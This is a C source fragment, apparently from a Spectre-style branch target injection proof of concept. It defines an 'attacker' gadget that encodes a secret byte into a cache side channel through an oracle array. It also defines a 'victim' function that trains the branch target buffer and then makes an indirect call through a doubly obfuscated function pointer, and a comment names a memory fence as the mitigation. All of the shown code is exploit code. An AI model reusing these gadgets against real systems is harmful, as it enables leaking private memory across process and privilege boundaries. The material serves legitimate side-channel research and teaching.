#include "btb.h"

int (*fp1)(char *info); // first layer of pointer obfuscation
int (**fp2)(char *info); // second layer of pointer obfuscation

int attacker(char *info){
    //_mm_mfence(); mitigates attack
    return oracle_block[*info * PAGESIZE]; // encode information in sidechannel
}

int safe(){ // do nothing of note
    return 42;
}

int victim(char *info, int input){
    static int result;
    // train btb by taking branches
    for (int i =BTB_TRAIN_RUNS; i > 0; i--){
        input += i;
        junk += input & i;
    }
    result = (*fp2)(info); // execute function via second level of obfuscation

    return result;
}